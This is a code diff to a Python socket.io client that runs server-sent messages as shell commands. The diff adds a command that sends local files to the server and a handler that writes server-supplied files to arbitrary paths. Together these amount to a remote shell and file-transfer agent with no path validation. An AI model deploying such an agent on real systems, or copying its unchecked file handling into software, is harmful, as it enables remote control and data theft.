@@ -3,6 +3,7 @@ import subprocess
 import os
 
 sio = socketio.Client()
+url = 'http://localhost:3000'
 
 class Session:
     def __init__(self):
@@ -24,10 +25,11 @@ def on_message(msg):
         try:
             os.chdir(msg[3:].strip())
             session.current_directory = os.getcwd()
+            sio.emit('message', f"Changed directory to: {session.current_directory}")
         except Exception as e:
             sio.emit('message', f"Error changing directory: {str(e)}")
-        else:
-            sio.emit('message', f"Changed directory to: {session.current_directory}")
+    elif msg.startswith('download '):
+        send_file(session.current_directory + '/' + msg[9:])
     else:
         output = execute_command(msg)
         sio.emit('message', output)
@@ -39,7 +41,21 @@ def execute_command(command):
     except Exception as e:
         return f"Error: {str(e)}"
 
-sio.connect('http://localhost:3000')
+@sio.event
+def updata(data):
+    file_name = data['fileName']
+    file_data = data['file']
+
+    with open(file_name, 'wb') as file:
+        file.write(file_data)
+
+def send_file(file_path):
+    file_name = os.path.basename(file_path)
+    with open(file_path, "rb") as file:
+        file_data = file.read()
+        sio.emit('file_transfer', {'file_name': file_name, 'file_data': file_data})
+
+sio.connect(url)
 
 try:
     while not session.exit_requested:
